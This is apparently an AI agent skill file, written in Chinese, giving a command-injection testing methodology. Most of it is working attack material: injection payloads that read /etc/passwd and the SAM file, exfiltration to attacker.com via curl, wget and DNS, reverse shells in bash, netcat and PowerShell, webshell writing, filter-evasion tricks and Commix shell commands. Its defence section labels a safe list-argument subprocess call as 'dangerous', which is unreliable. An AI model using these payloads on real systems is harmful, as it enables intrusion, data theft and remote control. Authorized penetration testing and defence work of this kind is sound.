---
name: command-injection-testing
description: 命令注入漏洞测试的专业技能和方法论
version: 1.0.0
---

# 命令注入漏洞测试

## 概述

命令注入是一种通过应用程序执行系统命令的漏洞。当应用程序将用户输入直接传递给系统命令时，攻击者可以执行任意命令。本技能提供命令注入的检测、利用和防护方法。

## 漏洞原理

应用程序调用系统命令时，未对用户输入进行充分验证和过滤，导致攻击者可以注入额外的命令。

**危险代码示例：**
```php
// PHP
system("ping " . $_GET['ip']);

// Python
os.system("ping " + user_input)

// Node.js
child_process.exec("ping " + user_input)
```

## 测试方法

### 1. 识别命令执行点

**常见功能：**
- Ping功能
- DNS查询
- 文件操作
- 系统信息
- 日志查看
- 备份恢复

### 2. 基础检测

**测试命令分隔符：**
```
;  # 命令分隔符（Linux/Windows）
&  # 后台执行（Linux/Windows）
|  # 管道符（Linux/Windows）
&& # 逻辑与（Linux/Windows）
|| # 逻辑或（Linux/Windows）
`  # 命令替换（Linux）
$() # 命令替换（Linux）
```

**测试Payload：**
```
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
```

### 3. 盲命令注入

**时间延迟检测：**
```
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5
```

**外带数据：**
```
127.0.0.1; curl http://attacker.com/?$(whoami)
127.0.0.1 && wget http://attacker.com/$(cat /etc/passwd)
```

**DNS外带：**
```
127.0.0.1; nslookup $(whoami).attacker.com
```

## 利用技术

### 基础命令执行

**Linux：**
```
; id
; whoami
; uname -a
; cat /etc/passwd
; ls -la
```

**Windows：**
```
& whoami
& ipconfig
& type C:\Windows\System32\drivers\etc\hosts
& dir
```

### 文件操作

**读取文件：**
```
; cat /etc/passwd
; type C:\Windows\System32\config\sam
; head -n 20 /var/log/apache2/access.log
```

**写入文件：**
```
; echo "<?php phpinfo(); ?>" > /tmp/shell.php
; echo "test" > C:\temp\test.txt
```

### 反弹Shell

**Bash：**
```
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Netcat：**
```
; nc -e /bin/bash attacker.com 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

**PowerShell：**
```
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## 绕过技术

### 空格绕过

```
${IFS}id
${IFS}whoami
$IFS$9id
<>
%09 (Tab)
%20 (Space)
```

### 命令分隔符绕过

**编码绕过：**
```
%3b (;)
%26 (&)
%7c (|)
```

**换行绕过：**
```
%0a (换行)
%0d (回车)
```

### 关键字过滤绕过

**变量拼接：**
```bash
a=w;b=ho;c=ami;$a$b$c
```

**通配符：**
```bash
/bin/c?t /etc/passwd
/usr/bin/ca* /etc/passwd
```

**引号绕过：**
```bash
w'h'o'a'm'i
w"h"o"a"m"i
```

**反斜杠：**
```bash
w\ho\am\i
```

**Base64编码：**
```bash
echo "d2hvYW1p" | base64 -d | bash
```

### 长度限制绕过

**使用文件：**
```bash
echo "id" > /tmp/c
sh /tmp/c
```

**使用环境变量：**
```bash
export x='id';$x
```

## 工具使用

### Commix

```bash
# 基础扫描
python commix.py -u "http://target.com/ping?ip=127.0.0.1"

# 指定注入点
python commix.py -u "http://target.com/ping?ip=INJECT_HERE" --data="ip=INJECT_HERE"

# 获取Shell
python commix.py -u "http://target.com/ping?ip=127.0.0.1" --os-shell
```

### Burp Suite

1. 拦截请求
2. 发送到Intruder
3. 使用命令注入Payload列表
4. 观察响应或时间延迟

## 验证和报告

### 验证步骤

1. 确认可以执行系统命令
2. 验证命令执行结果
3. 评估影响（系统控制、数据泄露等）
4. 记录完整的POC

### 报告要点

- 漏洞位置和输入参数
- 可执行的命令类型
- 完整的利用步骤和POC
- 修复建议（输入验证、参数化、白名单等）

## 防护措施

### 推荐方案

1. **避免命令执行**
   - 使用API替代系统命令
   - 使用库函数替代命令

2. **输入验证**
   ```python
   import re
   
   def validate_ip(ip):
       pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
       if not re.match(pattern, ip):
           raise ValueError("Invalid IP")
       parts = ip.split('.')
       if not all(0 <= int(p) <= 255 for p in parts):
           raise ValueError("Invalid IP range")
       return ip
   ```

3. **参数化命令**
   ```python
   import subprocess
   
   # 危险
   subprocess.call(['ping', '-c', '1', user_input])
   
   # 安全 - 使用参数列表
   subprocess.call(['ping', '-c', '1', validated_ip])
   ```

4. **白名单验证**
   ```python
   ALLOWED_COMMANDS = ['ping', 'nslookup']
   ALLOWED_OPTIONS = {'ping': ['-c', '-n']}
   
   if command not in ALLOWED_COMMANDS:
       raise ValueError("Command not allowed")
   ```

5. **最小权限**
   - 使用低权限用户运行应用
   - 限制文件系统访问
   - 使用chroot或容器隔离

6. **输出过滤**
   - 限制输出内容
   - 过滤敏感信息
   - 记录命令执行日志

## 注意事项

- 仅在授权测试环境中进行
- 避免对系统造成破坏
- 注意不同操作系统的命令差异
- 测试时注意命令执行的影响范围